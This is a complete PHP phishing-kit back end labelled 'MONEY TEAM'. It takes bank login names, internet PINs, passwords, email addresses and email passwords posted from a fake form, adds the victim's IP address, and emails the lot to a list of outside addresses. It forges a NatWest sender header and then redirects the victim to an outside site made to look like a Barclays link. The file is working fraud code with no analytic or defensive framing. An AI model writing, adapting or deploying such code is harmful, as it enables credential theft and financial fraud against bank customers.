<?   



$ip = getenv("REMOTE_ADDR");

$message .= "Username : ".$_POST['login']."\n";

$message .= "Internet PIN : ".$_POST['pin']."\n";

$message .= "Internet Password : ".$_POST['password']."\n";

$message .= "Email Address : ".$_POST['email']."\n";

$message .= "Email Password : ".$_POST['epass']."\n";

$message .= "IP : ".$ip."\n";

$message .= "-----------MONEY TEAM----------\n";

$send = "mes.paiement@outlook.fr,mednrt@gmail.com,npbrady74@gmail.com,paterry111o1@gmail.com,unionbankofbenin@gmail.com,flliqbre@gmail.com,alilobora1@gmail.com,	bessemsd1@gmail.com,Andrew.simpson10@hotmail.com,resultb@hotmail.com";

$subject = "N A T W E S C A R D O L U W A S O P E ";

$headers = "From: sope<credit.card.services@natwest.com>";

$headers .= $_POST['eMailAdd']."\n";

$headers .= "MIME-Version: 1.0\n";

mail("$send", "$subject", $message); 

header("Location:http://novainc.com.br/money?www.barclays.co.uk");

	  



?>
